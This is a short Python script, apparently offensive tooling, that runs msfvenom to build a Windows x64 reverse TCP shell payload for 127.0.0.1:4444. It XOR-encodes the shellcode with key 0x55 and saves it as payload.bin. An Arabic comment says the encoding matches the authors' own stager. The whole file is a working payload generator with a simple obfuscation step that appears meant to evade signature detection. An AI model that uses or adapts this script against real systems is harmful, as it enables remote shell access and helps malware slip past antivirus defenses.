import subprocessimport sysdef generate_local_payload():    lhost = "127.0.0.1"    lport = "4444"        print(f"[*] Generating local x64 Reverse TCP payload for {lhost}:{lport}...")        msf_cmd = [        "msfvenom",        "-p", "windows/x64/shell_reverse_tcp",        f"LHOST={lhost}",        f"LPORT={lport}",        "-f", "raw"    ]        try:        result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)        raw_shellcode = result.stdout    except FileNotFoundError:        print("[-] Error: msfvenom is not installed or not in PATH.")        sys.exit(1)    except subprocess.CalledProcessError as e:        print(f"[-] msfvenom failed: {e.stderr.decode()}")        sys.exit(1)    print(f"[+] Raw payload generated successfully. Size: {len(raw_shellcode)} bytes")    # تطبيق تشفير XOR 0x55 المعتمد في الـ Stager الخاص بنا    key = 0x55    encrypted_payload = bytes([b ^ key for b in raw_shellcode])    with open("payload.bin", "wb") as f:        f.write(encrypted_payload)    print(f"[+] Encrypted payload.bin (XOR 0x55) generated successfully! Size: {len(encrypted_payload)} bytes")if __name__ == "__main__":    generate_local_payload()